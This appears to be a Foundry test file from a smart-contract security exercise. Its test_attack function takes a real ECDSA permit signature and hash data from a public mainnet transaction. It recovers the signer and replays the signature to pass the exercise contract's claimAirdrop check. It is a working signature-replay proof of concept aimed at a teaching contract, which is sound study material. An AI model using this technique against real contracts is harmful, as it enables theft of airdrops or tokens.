// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Week22Exercise4} from "../src/Week22Exercise4.sol";

contract Week22Exercise4Test is Test {
    Week22Exercise4 public exercise;

    function setUp() public {
        exercise = new Week22Exercise4();
    }

    /// @dev giveaway tx: https://etherscan.io/tx/0x9050798d7989583632defa0c26e42d9fdfc30a66aa016fea849af303d7eda969
    /// @dev by inspecting this tx I was able to find a valid signature and hashed data
    /// I took the following data straight from the tx calldata on etherscan:
    /// r = 0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002
    /// s = 0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f
    /// v = 28
    /// address token       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    /// uint256 value	    49817428
    /// uint256 deadline	1666327223
    /// At this point I could have inspected the code on-chain to determine the hashStruct and domainSeparator
    /// Instead to save time I inspected the tx on tenderly to pull the following information from the debugger:
    /// hashStruct = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d9600000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc450000000000000000000000000000000000000000000000000000000002f82754000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000635222b7
    /// domainSeparator = 0x06c37168a7db5138defc7866392bb87a741f9b3d104deb5094588ce041cae335
    /// From this I can compute the full digest and recover the signerx
    function test_attack() public {
        bytes32 r = 0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002;
        bytes32 s = 0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f;
        uint8 v = 28;

        bytes memory signature = abi.encodePacked(r, s, v);

        bytes32 domainSeparator = 0x06c37168a7db5138defc7866392bb87a741f9b3d104deb5094588ce041cae335;

        bytes32 hashStruct = keccak256(getHashStruct());

        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, hashStruct)
        );

        address recoveredSigner = ecrecover(digest, v, r, s);
        console2.log("recoveredSigner: ", recoveredSigner); // 0xB1700C08Aa433b319dEF2b4bB31d6De5C8512D96

        exercise.claimAirdrop(100, digest, signature);
    }

    function getHashStruct() internal pure returns (bytes memory) {
        bytes32 a = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
        bytes32 b = 0x000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d96;
        bytes32 c = 0x00000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc45;
        bytes32 d = 0x0000000000000000000000000000000000000000000000000000000002f82754;
        bytes32 e = 0x0000000000000000000000000000000000000000000000000000000000000000;
        bytes32 f = 0x00000000000000000000000000000000000000000000000000000000635222b7;

        return abi.encodePacked(a, b, c, d, e, f);
    }
}
